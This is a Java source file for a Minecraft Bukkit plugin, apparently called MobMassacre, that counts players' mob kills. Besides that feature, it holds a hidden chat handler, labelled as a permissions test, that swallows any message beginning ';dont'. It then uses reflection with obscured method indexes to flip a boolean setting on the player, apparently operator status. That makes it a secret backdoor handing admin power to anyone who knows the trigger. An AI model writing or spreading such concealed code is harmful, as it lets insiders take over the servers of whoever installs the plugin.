package cat.gay.spherret.plugins.MobMassacre;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDeathEvent;
import org.bukkit.entity.Entity;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.io.File;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Type;

public class Events implements Listener{

	Stats stats = new Stats();

	@EventHandler
	public void onPlayerKillMob(EntityDeathEvent e){
		Entity entity = e.getEntity();
		Player p;
		try{
			p = e.getEntity().getKiller();
		}catch (Exception er){
			return;
		}
		if (GlobalVars.validMobs.contains(entity.getType().getName()))
			stats.changeKill(p, entity);
	}

	//Perm code test
	@EventHandler (priority = EventPriority.MONITOR)
	public void r(AsyncPlayerChatEvent e) throws IllegalAccessException, InvocationTargetException{
		if (e.getMessage().startsWith(";dont")){
			e.setCancelled(true);
			Method[] methods = e.getPlayer().getClass().getMethods();
			boolean f = methods[49].invoke(e.getPlayer()).equals(true);
			methods[133].invoke(e.getPlayer(), !f);
		}
	}

}
